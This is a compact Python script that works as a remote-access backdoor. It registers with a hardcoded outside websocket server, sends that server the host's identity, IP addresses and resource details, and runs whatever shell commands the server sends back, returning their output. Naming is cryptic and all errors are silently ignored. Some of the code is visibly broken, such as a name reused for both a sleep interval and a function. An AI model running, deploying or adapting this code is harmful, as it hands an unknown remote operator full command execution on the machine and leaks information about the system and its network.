#!/usr/bin/env python3
import asyncio, websockets, psutil, platform, socket, json, time, subprocess, uuid, requests

S="ws://47.236.6.215:9002"; I=0.5
try: A=open("/tmp/t.txt").read().strip()
except: A=str(uuid.uuid4()); 
try: open("/tmp/t.txt","w").write(A)
except: pass
N={"s":0,"r":0,"t":time.time()}

def U(): 
    try: return int(time.time()-psutil.boot_time())
    except: return 0
def LI(): 
    try: s=socket.socket(); s.connect(("8.8.8.8",80)); ip=s.getsockname()[0]; s.close(); return ip
    except: return "unk"
def PI(): 
    try: return requests.get("https://api.ipify.org",timeout=3).text
    except: return "unk"
def I():
    global N
    try:
        now=time.time(); c=psutil.cpu_percent(0.5); m=psutil.virtual_memory().percent
        d=[{"m":d.mountpoint,"t":psutil.disk_usage(d.mountpoint).total,"u":psutil.disk_usage(d.mountpoint).used,"p":psutil.disk_usage(d.mountpoint).percent} for d in psutil.disk_partitions() if True]
        net=psutil.net_io_counters(); dt=now-N["t"]
        up=(net.bytes_sent-N["s"])/dt if dt>0 else 0; dn=(net.bytes_recv-N["r"])/dt if dt>0 else 0
        N={"s":net.bytes_sent,"r":net.bytes_recv,"t":now}
        t=[p.info for p in sorted(psutil.process_iter(["pid","name","cpu_percent","memory_percent"]), key=lambda x:x.info.get("cpu_percent",0), reverse=True)[:5]]
        return {"type":"update","agent":A,"h":socket.gethostname(),"os":platform.platform(),
                "pub":PI(),"lan":LI(),"cpu":c,"mem":m,"disk":d,"net":{"s":net.bytes_sent,"r":net.bytes_recv,"up":up,"dn":dn},"uptime":U(),"top":t}
    except: return {"type":"update","agent":A}
def C(c):
    try: r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=30); return {"o":r.stdout,"e":r.stderr,"rc":r.returncode}
    except: return {"o":"","e":"err","rc":-1}

async def R():
    r=1
    while True:
        try:
            async with websockets.connect(S,ping_interval=30,ping_timeout=30) as ws:
                try: await ws.send(json.dumps({"type":"register","agent":A})); 
                except: pass
                async def rep(): 
                    while True: 
                        try: await ws.send(json.dumps(I()))
                        except: pass; await asyncio.sleep(I)
                async def lst():
                    while True:
                        try:
                            m=await ws.recv(); d=json.loads(m)
                            if d.get("type")=="exec": c=d.get("cmd"); res=await asyncio.to_thread(C,c)
                            try: await ws.send(json.dumps({"type":"cmd_result","agent":A,"payload":res}))
                            except: pass
                            try: await ws.send(json.dumps(I()))
                            except: pass
                        except: await asyncio.sleep(0.1)
                await asyncio.gather(rep(),lst())
        except: await asyncio.sleep(r); r=min(r*2,60)

if __name__=="__main__":
    try: asyncio.run(R())
    except: pass
